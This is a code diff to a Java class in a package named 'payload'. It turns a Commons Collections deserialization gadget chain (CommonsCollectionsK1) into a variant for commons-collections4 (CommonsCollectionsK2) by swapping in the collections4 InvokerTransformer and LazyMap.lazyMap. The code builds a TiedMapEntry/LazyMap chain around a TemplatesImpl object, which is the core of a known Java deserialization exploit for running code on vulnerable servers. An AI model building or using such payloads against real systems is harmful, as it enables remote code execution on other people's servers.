@@ -1,11 +1,9 @@
 package cn.safe6.payload;
 
 import cn.safe6.util.Gadgets;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.map.LazyMap;
 
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
@@ -13,7 +11,7 @@ import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonsCollectionsK1 {
+public class CommonsCollectionsK2 {
 
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
         Field field = obj.getClass().getDeclaredField(fieldName);
@@ -27,7 +25,8 @@ public class CommonsCollectionsK1 {
         InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
         HashMap<String, String> innerMap = new HashMap<String, String>();
-        Map m = LazyMap.decorate(innerMap, transformer);
+       // Map m = LazyMap.decorate(innerMap, transformer);
+        Map m = LazyMap.lazyMap(innerMap, transformer);
 
         Map outerMap = new HashMap();
         TiedMapEntry tied = new TiedMapEntry(m, templates);
